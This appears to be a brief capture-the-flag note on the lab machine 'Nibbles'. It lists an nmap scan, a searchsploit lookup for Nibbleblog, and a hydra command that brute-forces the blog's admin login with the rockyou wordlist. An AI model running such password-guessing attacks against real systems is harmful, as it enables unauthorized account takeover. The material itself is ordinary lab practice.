

# Nibbles

``` 
nmap -sC -sV -oA nmap/nibbles 10.10.10.75
```

> 10.10.10.75/nibbleblog   

得知这是nibbleblog
``` 
searchsploit nibbleblog

hydra -l admin -P rockyou.txt http://10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"

```
